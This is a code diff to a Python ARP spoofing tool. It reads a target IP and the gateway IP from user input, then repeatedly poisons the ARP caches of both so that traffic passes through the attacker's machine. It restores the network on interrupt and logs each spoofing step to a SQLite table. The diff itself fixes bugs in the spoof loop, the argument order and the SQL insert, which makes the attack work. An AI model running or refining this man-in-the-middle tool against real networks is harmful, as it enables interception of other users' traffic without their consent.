@@ -37,12 +37,13 @@ def spoof(y, target_ip, host_ip, verbose=True):
         db = "[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac)
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
         if y == False:
-            cur.execute('''INSERT INTO ARP_Spoofing (id, Values) VALUES (NULL, db)''')
+            cur.execute('''INSERT INTO ARP_Spoofing (id, Spoofing) VALUES (NULL, ?)''', (db,))
             conn.commit()
-            return y == True
+            y = True
+    return y
         
         
-def restore(x, target_ip, host_ip, verbose=True):
+def restore(target_ip, host_ip, verbose=True):
     """
     Restores the normal process of a regular network
     This is done by sending the original informations 
@@ -61,10 +62,6 @@ def restore(x, target_ip, host_ip, verbose=True):
     if verbose:
         db = "[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac)
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
-        if x == False:
-            cur.execute('''INSERT INTO ARP_Spoofing (id, Spoofing) VALUES (NULL, db)''')
-            conn.commit()
-            return x == True
         
        
 target = input("Enter target IP address: ")
@@ -72,17 +69,15 @@ host = input("Enter default gateway IP address: ")
 
 verbose = True
 try:
-        while True:
-            x = False
-            y = False       
-            # telling the `target` that we are the `host`
-            x = spoof(target, host, verbose, x)
-            spoof(target, host, verbose, x)
-            # telling the `host` that we are the `target`
-            y = spoof(target, host, verbose, y)
-            spoof(host, target, verbose, y)
-            # sleep for one second
-            time.sleep(1)
+    x = False
+    y = False
+    while True:  
+        # telling the `target` that we are the `host`
+        x = spoof(x, target, host, verbose)
+        # telling the `host` that we are the `target`
+        y = spoof(y, host, target, verbose)
+        # sleep for one second
+        time.sleep(1)
 except KeyboardInterrupt:
     print("[!] Detected CTRL+C ! restoring the network, please wait...")
     restore(target, host)
